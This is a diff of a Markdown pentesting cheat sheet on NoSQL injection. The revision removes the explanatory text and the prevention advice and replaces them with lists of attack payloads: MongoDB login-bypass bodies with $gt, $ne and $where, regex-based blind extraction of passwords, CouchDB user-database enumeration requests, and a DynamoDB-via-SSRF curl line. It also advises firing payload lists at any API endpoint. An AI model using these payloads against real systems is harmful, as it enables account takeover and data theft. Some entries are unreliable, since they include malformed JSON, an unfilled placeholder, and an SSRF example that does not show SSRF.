@@ -1,80 +1,60 @@
-# NoSQL Injection
-
-NoSQL injection occurs when user input is inserted into NoSQL database queries without sanitization. Unlike SQLi, NoSQL databases use JSON-like query structures, making injection detection and exploitation different.
+# NoSQL Injection: MongoDB, CouchDB, DynamoDB
 
 ## MongoDB Injection
 
 ### Authentication Bypass
-```javascript
-// Vulnerable code
-db.users.find({ username: req.body.username, password: req.body.password });
-
-// Payload (JSON)
-{ "username": "admin", "password": { "$ne": "" } }
-
-// URL-encoded
-username=admin&password[$ne]=
-
-// Using $gt (greater than, matches first user)
-username[$gt]=&password[$gt]=
+```json
+// Login form with JSON body
+{"username": "admin", "password": {"$gt": ""}}
+// URL-encoded variant
+username=admin&password[$gt]=
+// Query operator injection
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"$where": "this.password == '' || true"}
 ```
 
-### Parameter Injection
-```javascript
-// If application uses req.query directly
-// URL: /api/users?username=admin&password[$regex]=.*
-
-// This becomes:
-db.users.find({ "username": "admin", "password": { "$regex": ".*" } });
+### Operator-Based Data Extraction
+```json
+// Check if password starts with 'a'
+{"username": "admin", "password": {"$regex": "^a"}}
+// Boolean-based blind: iterate through characters
+{"username": "admin", "password": {"$regex": "^{}"}}
+// Use $where for more flexibility
+{"$where": "this.password.length == 32"}
+{"$where": "this.username == 'admin' && this.password.startsWith('a')"}
 ```
 
-### $where Injection
-```javascript
-// Vulnerable code
-db.users.find({ $where: "this.username == '" + username + "'" });
-
-// Payload
-username: "' || sleep(5000) || '"
+### NoSQL Error-Based
+```json
+// Trigger verbose errors
+{"$where": "1"}"}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+// Type confusion
+{"username": 1, "password": 1}
 ```
 
-### Boolean-Based Blind Injection
-```javascript
-// Check if condition is true
-// Payload: username[$ne]=nonexistent
-// true: no results returned, false: results returned
+## CouchDB
 
-// Exfiltrate character by character
-username[$regex]=^a
-username[$regex]=^b
-// etc.
+```http
+GET /_all_docs HTTP/1.1
+Host: target.com:5984
+GET /_users/_all_docs HTTP/1.1
 ```
 
-## Operators
+## DynamoDB Injection (via SSRF)
 
-| Operator | Purpose | Example |
-|----------|---------|---------|
-| `$ne` | Not equal | `password[$ne]=` |
-| `$gt` | Greater than | `username[$gt]=` |
-| `$regex` | Regex match | `email[$regex]=.*@target.com` |
-| `$exists` | Field exists | `field[$exists]=true` |
-| `$in` | In array | `role[$in][]=admin` |
-| `$nin` | Not in array | `role[$nin][]=user` |
-| `$where` | JS expression | `$where=sleep(5000)` |
-
-## NoSQLMap
+DynamoDB injection typically requires SSRF to reach the DynamoDB API endpoint:
 
 ```bash
-nosqlmap --url "https://target.com/api/login" -A login
-nosqlmap --url "https://target.com/api/users" -A data
+# Via SSRF to DynamoDB API
+curl http://dynamodb.<region>.amazonaws.com/ -H "Host: dynamodb.<region>.amazonaws.com"
 ```
 
-## Prevention
+## Detection Strategy
 
-1. **Input validation** — Reject `$` and `.` in keys
-2. **Use ORM sanitization** — Mongoose strict mode
-3. **Parameterized queries** — Avoid string concatenation
-4. **Escaping** — Escape special NoSQL operators
+NoSQL injection is context-dependent:
+1. JSON API endpoints with MongoDB backend — test `$gt`, `$ne`, `$regex`, `$where`
+2. Express.js apps with `qs` library — test `param[$gt]=` in URL-encoded requests
+3. SPA with GraphQL — test NoSQL operators in resolver arguments
 
----
-
-> **Next**: [Server-Side Request Forgery (SSRF)](05-ssrf.md)
+Use Burp Intruder with a NoSQL-specific payload list against any API endpoint that accepts JSON or URL-encoded parameters.
